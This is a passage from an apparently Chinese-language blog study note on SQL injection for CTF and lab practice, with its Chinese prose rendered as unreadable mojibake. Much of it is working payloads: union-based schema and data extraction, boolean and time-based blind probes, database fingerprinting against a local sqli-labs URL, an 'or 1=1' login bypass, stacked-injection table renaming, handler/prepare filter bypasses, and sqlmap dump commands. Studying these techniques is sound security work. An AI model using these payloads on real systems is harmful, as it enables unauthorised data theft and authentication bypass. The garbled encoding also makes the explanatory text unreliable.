æ­¤è¦å®ç°è®©å‰ä¸€ä¸ªselectè¯­å¥æŸ¥è¯¢ç»“æœä¸ºç©ºï¼Œå¯ä»¥è®©å…¶WHEREåè·Ÿçš„æ¡ä»¶å§‹ç»ˆä¸ºåŠ ï¼Œå¦‚ï¼š<code>1 and 1=2</code><br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221925.png" alt="1"></li><li>å‰©ä¸‹çš„åŒå­—ç¬¦å‹æ³¨å…¥ä¸€æ ·çš„æµç¨‹ï¼šå¾—åˆ°æ•°æ®åº“åã€è¡¨åã€å­—æ®µåï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢ç»“æœåªè¿”å›ä¸€è¡Œï¼Œä¸ºäº†é˜²æ­¢æŸ¥è¯¢ç»“æœæœ‰å¤šè¡Œæ— æ³•æ˜¾ç¤ºå®Œå…¨ï¼Œä½¿ç”¨<code>group_concat(å­—æ®µå)</code>å‡½æ•°ï¼Œå°†æ‰€æœ‰è¡Œç»¼åˆä¸ºä¸€è¡Œè¾“å‡ºï¼Œæœ€ç»ˆå¾—åˆ°flag<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032222504.png" alt="1"></li></ul><h3 id="2-3-SQLç›²æ³¨"><a href="#2-3-SQLç›²æ³¨" class="headerlink" title="2.3 SQLç›²æ³¨"></a>2.3 SQLç›²æ³¨</h3><p>ç›²æ³¨æŒ‡SQLè¯­å¥æ‰§è¡ŒæŸ¥è¯¢åï¼ŒæŸ¥è¯¢æ•°æ®ä¸èƒ½å›æ˜¾åˆ°å‰ç«¯é¡µé¢ä¸­</p><h4 id="å¯èƒ½éœ€è¦ç”¨åˆ°çš„å‡½æ•°ã€å…³é”®å­—"><a href="#å¯èƒ½éœ€è¦ç”¨åˆ°çš„å‡½æ•°ã€å…³é”®å­—" class="headerlink" title="å¯èƒ½éœ€è¦ç”¨åˆ°çš„å‡½æ•°ã€å…³é”®å­—"></a>å¯èƒ½éœ€è¦ç”¨åˆ°çš„å‡½æ•°ã€å…³é”®å­—</h4><ul><li>substr(å­—ç¬¦ä¸²,ç´¢å¼•å¼€å§‹ä½,ç´¢å¼•ç»“æŸä½):ç”¨äºè·å–å­—ç¬¦ä¸²ä¸­çš„ç‰¹å®šå­—ç¬¦</li><li><code>limit å¼€å§‹è¡Œæ•°çš„ç´¢å¼•,æ˜¾ç¤ºçš„æ€»è¡Œæ•°</code>:æ”¾åœ¨selectæŸ¥è¯¢è¯­å¥æœ€å,é™åˆ¶æ˜¾ç¤ºè¡Œæ•°,ç´¢å¼•ä»0å¼€å§‹</li><li>ascii(å­—ç¬¦):å°†æŸä¸ªå­—ç¬¦è½¬æ¢ä¸ºasciiå€¼</li><li>ord(str)ï¼šå‡½æ•°è¿”å›å­—ç¬¦ä¸²strçš„æœ€å·¦è¾¹å­—ç¬¦çš„ASCIIç å€¼</li></ul><h4 id="å¸ƒå°”ç›²æ³¨-å­—ç¬¦å‹ä¸ºä¾‹"><a href="#å¸ƒå°”ç›²æ³¨-å­—ç¬¦å‹ä¸ºä¾‹" class="headerlink" title="å¸ƒå°”ç›²æ³¨(å­—ç¬¦å‹ä¸ºä¾‹)"></a>å¸ƒå°”ç›²æ³¨(å­—ç¬¦å‹ä¸ºä¾‹)</h4><p>é€‚ç”¨äºå›æ˜¾åªæœ‰ä¸¤ç§çš„æƒ…å†µï¼Œå¦‚<code>User ID exists in the database.</code>å’Œ<code>User ID is MISSING from the database.</code>åˆ†åˆ«å¯¹åº”äº†è¾“å…¥è¯­å¥è¿”å›çš„å¸ƒå°”å€¼ã€‚</p><ul><li>å¦‚æœé‡‡ç”¨æ‰‹åŠ¨æ³¨å…¥ï¼Œä¸€èˆ¬è¦ç»“åˆäºŒåˆ†æŸ¥æ‰¾ã€ç©·ä¸¾æ³•ç­‰æ–¹æ³•æ¥é€ä¸€ç ´è§£å‡ºåº“ã€è¡¨ã€å­—æ®µçš„åç§°ã€‚(ä»¥ä¸‹ä¸ºçŒœè§£æ•°æ®åº“åç§°çš„ä¾‹å­)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-title function_">count</span><span class="hljs-params">(schema_name)</span> from information_schema.schemata)&gt; n # <span class="hljs-comment">//çŒœè§£æ•°æ®åº“ä¸ªæ•°</span><br>1&#x27; and <span class="hljs-title function_">length</span><span class="hljs-params">(database())</span>=n # <span class="hljs-comment">//nä¸ºå¤§äº1çš„æ•´æ•°,çŒœè§£æ•°æ®åº“åç§°é•¿åº¦</span><br><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-title function_">ascii</span><span class="hljs-params">(substr((select schema_name from information_schema.schemata limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))</span>)&gt;n # <span class="hljs-comment">//nä¸ºå¤§å°å†™å­—æ¯å¯¹åº”çš„ASCIIç å€¼ï¼Œæ­¤å¤„éœ€å€Ÿç”¨äºŒåˆ†æŸ¥æ‰¾æ¥é€ä¸€ç¡®å®šæ¯ä¸€ä¸ªæ•°æ®åº“çš„åç§°</span><br></code></pre></td></tr></table></figure><ul><li>å¯ä»¥å€Ÿç”¨sqlmapå·¥å…·æ¥è‡ªåŠ¨åŒ–å®ç°è¿™ç§æœºå™¨çš„è¿‡ç¨‹ï¼Œmacä¸‹å…·ä½“æŒ‡ä»¤ä¸º</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">sqlmap -u <span class="hljs-string">&quot;ç½‘å€&quot;</span> --batch --dbs  <span class="hljs-comment">//è·å–æ•°æ®åº“åç§°,batchæ„æ€ä¸ºä¸è¯¢é—®è¾“å…¥é»˜è®¤è¾“å…¥Y</span><br>sqlmap -u <span class="hljs-string">&quot;ç½‘å€&quot;</span> --batch -D æ•°æ®åº“å --tables <span class="hljs-comment">//è·å–è¡¨å</span><br>sqlmap -u <span class="hljs-string">&quot;ç½‘å€&quot;</span> --batch -D æ•°æ®åº“å -T è¡¨å --columns <span class="hljs-comment">//è·å–å­—æ®µå</span><br>sqlmap -u <span class="hljs-string">&quot;ç½‘å€&quot;</span> --batch -D æ•°æ®åº“å -T è¡¨å -C å­—æ®µå --dump <span class="hljs-comment">//è·å–å­—æ®µå†…å­˜å‚¨ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><p>æœ€ç»ˆå¾—åˆ°flag<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032222451.png" alt="1"></p><h4 id="æ—¶é—´ç›²æ³¨-å­—ç¬¦å‹ä¸ºä¾‹"><a href="#æ—¶é—´ç›²æ³¨-å­—ç¬¦å‹ä¸ºä¾‹" class="headerlink" title="æ—¶é—´ç›²æ³¨(å­—ç¬¦å‹ä¸ºä¾‹)"></a>æ—¶é—´ç›²æ³¨(å­—ç¬¦å‹ä¸ºä¾‹)</h4><p>ä»…è¦æ±‚æœ‰å›æ˜¾ï¼Œä¸»è¦åŸç†æ˜¯åˆ©ç”¨SQLä¸­ifå‡½æ•°åŠsleepå‡½æ•°å†åŠ ä¸Šå…¶ä»–ç”¨äºæ‹†è§£å­—ç¬¦ä¸²ã€è½¬æ¢å­—ç¬¦ä¸ºASCIIç å€¼çš„å‡½æ•°ï¼Œsleepå‡½æ•°ä½œä¸ºifå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼ŒçŒœè§£åç§°çš„å‡½æ•°ä½œä¸ºifçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥ä»»æ„èµ‹å€¼ï¼Œä½†ä¸èƒ½ä¸sleepå‡½æ•°ç›¸åŒï¼Œå› æ­¤è‹¥çŒœè§£å‡½æ•°è¿”å›æ­£ç¡®ï¼Œåˆ™æ‰§è¡Œsleepå‡½æ•°ï¼Œæ•ˆæœä¸ºç½‘é¡µå»¶è¿Ÿäº†è®¾å®šçš„æè¿°æ‰æ˜¾ç¤ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1&#x27;</span> and <span class="hljs-title function_">if</span> <span class="hljs-params">((ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">100</span>),sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)</span> # <span class="hljs-comment">//åˆ¤æ–­æ•°æ®åº“åç§°ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸º&#x27;d&#x27;ï¼Œç»“æœæ˜¾ç¤ºæ˜æ˜¾å»¶è¿Ÿ</span><br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€åˆ¤æ–­æ³¨å…¥ç‚¹"><a href="#ä¸‰ã€åˆ¤æ–­æ³¨å…¥ç‚¹" class="headerlink" title="ä¸‰ã€åˆ¤æ–­æ³¨å…¥ç‚¹"></a>ä¸‰ã€åˆ¤æ–­æ³¨å…¥ç‚¹</h2><h3 id="3-1åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´"><a href="#3-1åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´" class="headerlink" title="3.1åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´"></a>3.1åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´</h3><p>è¾“å…¥<code>1&#39;</code>å¦‚æœæŠ¥é”™ï¼Œåˆ™å­˜åœ¨æ³¨å…¥æ¼æ´ï¼ŒæŠ¥é”™åŸå› æ˜¯å•å¼•å·æ•°é‡ä¸åŒ¹é…ï¼Œå¦‚æœæ²¡æŠ¥é”™ï¼Œè¯´æ˜å¯èƒ½è¯¥ç½‘é¡µè¿‡æ»¤äº†å•å¼•å·</p><h3 id="3-2åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•´æ•°å‹"><a href="#3-2åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•´æ•°å‹" class="headerlink" title="3.2åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•´æ•°å‹"></a>3.2åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•´æ•°å‹</h3><ul><li>è¾“å…¥<code>1 and 1=2</code>å’Œ<code>1&#39;#</code>å’Œ<code>1&#39; and &#39;1&#39;=&#39;1</code>è‹¥éƒ½å›æ˜¾idä¸º1çš„ä¿¡æ¯,åˆ™ä¸ºå­—ç¬¦å‹</li><li>è¾“å…¥<code>1 and 1=2</code>æ²¡æœ‰å›æ˜¾ï¼Œä¸”è¾“å…¥<code>1 and 1=1</code>æœ‰å›æ˜¾ï¼Œåˆ™ä¸ºæ•°å­—å‹,åŸå› <code>1 and 1=2</code>æ’ä¸ºå‡ï¼Œè¿‡æ»¤æ‰æ‰€æœ‰çš„è¡Œ</li></ul><h3 id="3-3åˆ¤æ–­èƒ½å¦æ—¶é—´ç›²æ³¨"><a href="#3-3åˆ¤æ–­èƒ½å¦æ—¶é—´ç›²æ³¨" class="headerlink" title="3.3åˆ¤æ–­èƒ½å¦æ—¶é—´ç›²æ³¨"></a>3.3åˆ¤æ–­èƒ½å¦æ—¶é—´ç›²æ³¨</h3><table><thead><tr><th align="left">MySQL</th><th align="left">benchmark(100000000,md(5))sleep(3)</th></tr></thead><tbody><tr><td align="left">PostgreSQL</td><td align="left">PG_sleep(5)Generate_series(1,1000000)</td></tr><tr><td align="left">SQLServer</td><td align="left">waitfor delay â€˜0:0:5â€™</td></tr></tbody></table><h3 id="3-4åˆ¤æ–­æ•°æ®åº“ç±»å‹"><a href="#3-4åˆ¤æ–­æ•°æ®åº“ç±»å‹" class="headerlink" title="3.4åˆ¤æ–­æ•°æ®åº“ç±»å‹"></a>3.4åˆ¤æ–­æ•°æ®åº“ç±»å‹</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>åˆ¤æ–­æ˜¯å¦æ˜¯ Mysqlæ•°æ®åº“<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> information_schema.tables) #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>åˆ¤æ–­æ˜¯å¦æ˜¯ accessæ•°æ®åº“<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> msysobjects) #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>åˆ¤æ–­æ˜¯å¦æ˜¯ Sqlserveræ•°æ®åº“<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> sysobjects) #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>åˆ¤æ–­æ˜¯å¦æ˜¯Oracleæ•°æ®åº“<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> dual)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> #<br></code></pre></td></tr></table></figure><h2 id="å››ã€å¸¸ç”¨å‡½æ•°ã€åŸºç¡€çŸ¥è¯†"><a href="#å››ã€å¸¸ç”¨å‡½æ•°ã€åŸºç¡€çŸ¥è¯†" class="headerlink" title="å››ã€å¸¸ç”¨å‡½æ•°ã€åŸºç¡€çŸ¥è¯†"></a>å››ã€å¸¸ç”¨å‡½æ•°ã€åŸºç¡€çŸ¥è¯†</h2><h3 id="ç³»ç»Ÿå‡½æ•°"><a href="#ç³»ç»Ÿå‡½æ•°" class="headerlink" title="ç³»ç»Ÿå‡½æ•°"></a>ç³»ç»Ÿå‡½æ•°</h3><ul><li>system_user()â€”â€”ç³»ç»Ÿç”¨æˆ·å </li><li>user()â€”â€”ç”¨æˆ·å </li><li>current_user()â€”â€”å½“å‰ç”¨æˆ·å </li><li>session_user()â€”â€”é“¾æ¥æ•°æ®åº“çš„ç”¨æˆ·å </li><li>database()â€”â€”æ•°æ®åº“å </li><li>version()â€”â€”æ•°æ®åº“ç‰ˆæœ¬ </li><li>@@datadirâ€”â€”æ•°æ®åº“è·¯å¾„ </li><li>@@basedirâ€”â€”æ•°æ®åº“å®‰è£…è·¯å¾„ </li><li>@@version_conpile_osâ€”â€”æ“ä½œç³»ç»Ÿ</li></ul><h3 id="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"><a href="#å­—ç¬¦ä¸²è¿æ¥å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"></a>å­—ç¬¦ä¸²è¿æ¥å‡½æ•°</h3><ul><li>concat(str1,str2,â€¦)â€”â€”æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸² </li><li>concat_ws(separator,str1,str2,â€¦)â€”â€”å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸² </li><li>group_concat(str1,str2,â€¦)â€”â€”è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®ã€‚</li></ul><h3 id="ä¸¤ç§æ³¨é‡Š"><a href="#ä¸¤ç§æ³¨é‡Š" class="headerlink" title="ä¸¤ç§æ³¨é‡Š"></a>ä¸¤ç§æ³¨é‡Š</h3><ul><li>â€“+</li><li><code>#</code>(urlç¼–ç %23)</li></ul><h3 id="sqlä¸­çš„é€»è¾‘è¿ç®—"><a href="#sqlä¸­çš„é€»è¾‘è¿ç®—" class="headerlink" title="sqlä¸­çš„é€»è¾‘è¿ç®—"></a>sqlä¸­çš„é€»è¾‘è¿ç®—</h3><p>ä¸‡èƒ½å¯†ç æ„é€ </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>â€™adminâ€™ andpassword<span class="hljs-operator">=</span>â€™â€™<span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p>åœ¨sqlä¸­andè¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§äºorè¿ç®—ç¬¦ï¼Œç±»æ¯”&amp;&amp;&gt;||</p></blockquote><p>sqlä¸­ä¹Ÿèƒ½ä½¿ç”¨ä½è¿ç®—</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">&amp;</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><blockquote><p>&amp;çš„ä¼˜å…ˆçº§å¤§äº&#x3D;</p></blockquote><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> å­—æ®µ [<span class="hljs-keyword">asc</span><span class="hljs-operator">|</span><span class="hljs-keyword">desc</span>]; # <span class="hljs-keyword">asc</span>å‡åºï¼Œé»˜è®¤çš„<br></code></pre></td></tr></table></figure><blockquote><p>ç”¨äºåˆ¤æ–­åˆ—æ•°ï¼Œä¸çŸ¥é“åˆ—åæ—¶ç”¨1 2 3â€¦â€¦è¡¨ç¤ºç¬¬1 2 3â€¦â€¦åˆ—</p></blockquote><h3 id="ç³»ç»Ÿæ•°æ®åº“ï¼ˆinformation-schemaï¼‰"><a href="#ç³»ç»Ÿæ•°æ®åº“ï¼ˆinformation-schemaï¼‰" class="headerlink" title="ç³»ç»Ÿæ•°æ®åº“ï¼ˆinformation_schemaï¼‰"></a>ç³»ç»Ÿæ•°æ®åº“ï¼ˆinformation_schemaï¼‰</h3><p>mysqlç‰ˆæœ¬&gt;&#x3D;5.0</p><p>è¯¥åº“ä¸­æœ‰ä¸‰ä¸ªè¡¨schemata(å„æ•°æ®åº“åschema_name)ã€tables(å„è¡¨åtable_name)ã€columns(å„åˆ—å)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata # æŸ¥æ•°æ®åº“å<br><span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xxxxx&#x27;</span>; #æŸ¥è¡¨å<br><span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xxxxx&#x27;</span>; #æŸ¥åˆ—å <br></code></pre></td></tr></table></figure><h2 id="äº”ã€æ³¨å…¥ç±»å‹"><a href="#äº”ã€æ³¨å…¥ç±»å‹" class="headerlink" title="äº”ã€æ³¨å…¥ç±»å‹"></a>äº”ã€æ³¨å…¥ç±»å‹</h2><h3 id="SQLæ³¨å…¥çš„åˆ†ç±»"><a href="#SQLæ³¨å…¥çš„åˆ†ç±»" class="headerlink" title="SQLæ³¨å…¥çš„åˆ†ç±»"></a>SQLæ³¨å…¥çš„åˆ†ç±»</h3><p><strong>ä¾æ®æ³¨å…¥ç‚¹ç±»å‹åˆ†ç±»</strong></p><ul><li><p>æ•°å­—ç±»å‹çš„æ³¨å…¥</p></li><li><p>å­—ç¬¦ä¸²ç±»å‹çš„æ³¨å…¥</p></li><li><p>æœç´¢å‹æ³¨å…¥</p></li></ul><p><strong>ä¾æ®æäº¤æ–¹å¼åˆ†ç±»</strong></p><ul><li><p>GETæ³¨å…¥</p></li><li><p>POSTæ³¨å…¥</p></li><li><p>COOKIEæ³¨å…¥</p></li><li><p>HTTPå¤´æ³¨å…¥(XFFæ³¨å…¥ã€UAæ³¨å…¥ã€REFERERæ³¨å…¥ï¼‰</p></li></ul><p><strong>ä¾æ®è·å–ä¿¡æ¯çš„æ–¹å¼åˆ†ç±»</strong></p><ul><li><p>åŸºäºå¸ƒå°”çš„ç›²æ³¨</p></li><li><p>åŸºäºæ—¶é—´çš„ç›²æ³¨</p></li><li><p>åŸºäºæŠ¥é”™çš„æ³¨å…¥</p></li><li><p>è”åˆæŸ¥è¯¢æ³¨å…¥</p></li><li><p>å †å æ³¨å…¥ (å¯åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥)</p></li></ul><h2 id="è”åˆæ³¨å…¥"><a href="#è”åˆæ³¨å…¥" class="headerlink" title="è”åˆæ³¨å…¥"></a>è”åˆæ³¨å…¥</h2><p>è¦æ±‚åˆ—æ•°ä¸€è‡´</p><h3 id="å­—ç¬¦å‹"><a href="#å­—ç¬¦å‹" class="headerlink" title="å­—ç¬¦å‹"></a>å­—ç¬¦å‹</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span>  <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><blockquote><p>æ•´å‹çš„ä¹Ÿå·®ä¸å¤šï¼Œå»æ‰â€™</p><p>éƒ¨åˆ†é¢˜ç›®ä¹Ÿå¯èƒ½åœ¨å­—ç¬¦å‹åŸºç¡€ä¸ŠåŠ æ‹¬å·ç­‰,è‹¥æ³¨é‡Šè¢«å±è”½</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> â€¦â€¦ <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure></blockquote><h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><p>å¤šæ¡sqlè¯­å¥ä¸€èµ·æ‰§è¡Œ,åˆ©ç”¨åŠ <code>;</code>çš„æ“ä½œ</p><h3 id="å±€é™æ€§"><a href="#å±€é™æ€§" class="headerlink" title="å±€é™æ€§"></a>å±€é™æ€§</h3><p>å—åˆ°APIæˆ–æ•°æ®åº“å¼•æ“ä¸æ”¯æŒï¼Œæƒé™ä¸è¶³ç­‰</p><h3 id="å¸¸è§æ€è·¯"><a href="#å¸¸è§æ€è·¯" class="headerlink" title="å¸¸è§æ€è·¯"></a>å¸¸è§æ€è·¯</h3><p>å¯è€ƒè™‘ä½¿ç”¨RENAMEå…³é”®å­—ï¼Œå°†æƒ³è¦çš„æ•°æ®åˆ—å&#x2F;è¡¨åæ›´æ”¹æˆè¿”å›æ•°æ®çš„SQLè¯­å¥æ‰€å®šä¹‰çš„è¡¨&#x2F;åˆ—åã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> tables; #æŸ¥çœ‹æ‰€æœ‰è¡¨<br><span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> `è¡¨å`; #çœ‹åˆ—<br>RENAME <span class="hljs-keyword">TABLE</span> `words` <span class="hljs-keyword">TO</span> `words1`; #æ”¹åä¸ºwords1<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> `words` CHANGE `flag` `id` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>;#å°†æ–°wordsè¡¨çš„åˆ—flagæ”¹ä¸ºid<br></code></pre></td></tr></table></figure><h3 id="å¸¸è§bypass"><a href="#å¸¸è§bypass" class="headerlink" title="å¸¸è§bypass"></a>å¸¸è§bypass</h3><p>è¿‡æ»¤selectæ—¶ï¼Œä½¿ç”¨handlerè¯­å¥ï¼ˆmysqlä¸“ç”¨è¯­å¥ï¼‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">handler users <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> hd; #æŒ‡å®šæ•°æ®è¡¨usersè¿›è¡Œè½½å…¥å¹¶å°†è¿”å›å¥æŸ„é‡å‘½åä¸ºhd<br>handler hd read <span class="hljs-keyword">first</span>; #è¯»å–æŒ‡å®šè¡¨<span class="hljs-operator">/</span>å¥æŸ„çš„é¦–è¡Œæ•°æ®<br>handler hd read next; #è¯»å–æŒ‡å®šè¡¨<span class="hljs-operator">/</span>å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®<br>handler hd <span class="hljs-keyword">close</span>; #å…³é—­å¥æŸ„<br></code></pre></td></tr></table></figure><p>é¢„å¤„ç†</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">prepare</span> xxx <span class="hljs-keyword">from</span> &quot;sqlè¯­å¥&quot;;<br><span class="hljs-keyword">execute</span> xxx;<br>#ç”±äº<span class="hljs-keyword">sql</span>è¯­å¥æ˜¯å­—ç¬¦ä¸²ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨æ“ä½œå­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œç»•è¿‡ä¸€äº›è¿‡æ»¤<br>#æ¯”å¦‚è¿‡æ»¤äº†<span class="hljs-keyword">select</span><br><span class="hljs-keyword">PREPARE</span> st <span class="hljs-keyword">from</span> concat(<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;elect&#x27;</span>, <span class="hljs-string">&#x27; * from `1919810931114514`&#x27;</span>);<span class="hljs-keyword">EXECUTE</span> st;#<br></code></pre></td></tr></table></figure><p>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯éšä¾¿æ³¨</p><h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><h3 id="æˆªå–å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°"><a href="#æˆªå–å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°" class="headerlink" title="æˆªå–å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°"></a>æˆªå–å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°</h3><ul><li><p>mid(): <code>mid(s,n,len);</code> ä»å­—ç¬¦ä¸² s çš„ n ä½ç½®æˆªå–é•¿åº¦ä¸º len çš„å­å­—ç¬¦ä¸²</p></li><li><p>substr()&#x2F;substring(): <code>substr(s, start, length); substring(s, start, length)</code> ä»å­—ç¬¦ä¸² s çš„ start ä½ç½®æˆªå–é•¿åº¦ä¸º length çš„å­å­—ç¬¦ä¸²</p></li><li><p>left(): <code>left(s,n);</code> è¿”å›å­—ç¬¦ä¸² s çš„å‰ n ä¸ªå­—ç¬¦</p></li><li><p>right(): <code>right(s,n);</code> è¿”å›å­—ç¬¦ä¸² s çš„å n ä¸ªå­—ç¬¦</p></li><li><p>ascii()&#x2F;ord() <code>ascii(s);/ord(s);</code> è¿”å›å­—ç¬¦ä¸² s çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII ç 